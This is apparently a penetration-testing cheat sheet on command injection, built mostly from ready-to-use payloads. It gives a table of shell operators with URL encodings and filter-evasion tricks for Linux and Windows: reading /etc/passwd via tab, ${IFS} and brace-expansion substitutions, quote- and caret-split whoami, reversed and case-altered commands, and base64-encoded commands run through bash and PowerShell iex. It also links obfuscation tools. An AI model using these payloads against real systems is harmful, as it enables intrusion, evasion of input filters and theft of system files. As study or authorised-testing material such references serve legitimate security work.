# Web

[[ TOC]]

## Command Injection
### Detection

| Character | URL-encoded Character | Executed Command |
| :-----------: | -------------------- | ----------------- |
|   ;  | %3b       | Both                                       |
|  \n  | %0a       | Both                                       |
|   &  | %26       | Both (second output generally shown first) |
|  \|  | %7c       | Both (only second output is shown)         |
|  &&  | %26%26    | Both (only if first succeeds)              |
| \|\| | %7c%7c    | Second (only if first fails)               |
|  ``  | %60%60    | Both (Linux-only)                          |
|  $() | %24%28%29 | Both (Linux-only)                          |

### Bypassing filters

#### Linux

##### Bypassing blacklisted characters

Using Tabs

```bash
cat%09/etc/passwd
```

Using ${IFS}

```bash
cat${IFS}/etc/passwd
```

Using Brace Expansion

```bash
{cat,/etc/passwd}
```

Using Characters from Environment Variables

```bash
echo ${PATH:0:1}
/
```

```bash
echo ${LS_COLORS:10:1}
;
```
>print all env in Linux

```bash
printenv
```

Using Characters Shifting

```bash
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)
\
```
##### Bypassing Commands Blacklist
Adding '

```bash
w'h'o'am'i
```
Adding "

```bash
w"h"o"am"i
```
>You can't mix types of quotes and the number of quotes must be even

Adding $@

```bash
who$@ami
```
Case manipulation

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

```bash
$(a="WhOaMi";printf %s "${a,,}")
```
Reversed commands

```bash
$(rev<<<'imaohw')
```
Encoded commands

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
>You can use other alternatives like *sh* instead of *bash* or *openssl* for b64 decoding or *xxd* fpr hex decoding

#### Tools

[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)


### Windows

##### Bypassing blacklisted characters

Using Characters from Environment Variables (CMD)

```cmd
echo %HOMEPATH:~6,-11%
\
```
Using Characters from Environment Variables (PowerShell)

```powershell
$env:HOMEPATH[0]
\
```
>print all env in Windows PowerShell

```PowerShell
Get-ChildItem Env:
```
##### Bypassing Commands Blacklist

Adding '

```cmd
w'h'o'am'i
```
Adding "

```cmd
w"h"o"am"i
```
>You can't mix types of quotes and the number of quotes must be even

Adding ^

```cmd
who^ami
```

Case manipulation
```powershell
WhOaMi
```

Reversed commands

```PowerShell
iex "$('imaohw'[-1..-20] -join '')"
```

Encoded commands

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
#### Tools 

[DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

### Additional links 

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
